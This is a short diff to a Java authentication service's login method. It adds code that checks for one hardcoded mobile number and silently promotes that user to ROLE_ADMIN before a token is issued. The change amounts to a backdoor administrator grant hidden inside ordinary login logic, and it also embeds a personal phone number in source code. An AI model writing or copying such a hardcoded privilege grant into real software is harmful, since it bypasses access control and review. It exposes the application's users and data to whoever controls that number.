@@ -92,6 +92,12 @@ public class AuthService {
         User user = userRepository.findByMobile(request.getMobile())
                 .orElseThrow(() -> new RuntimeException("User not found"));
 
+        // If this specific user logs in and isn't admin yet (e.g. registered before), upgrade them now
+        if ("7010903976".equals(user.getMobile()) && !"ROLE_ADMIN".equals(user.getRole())) {
+            user.setRole("ROLE_ADMIN");
+            user = userRepository.save(user);
+        }
+
         // 3. Generate a new JWT token
         String token = jwtTokenProvider.generateToken(user.getId(), user.getRole());
 
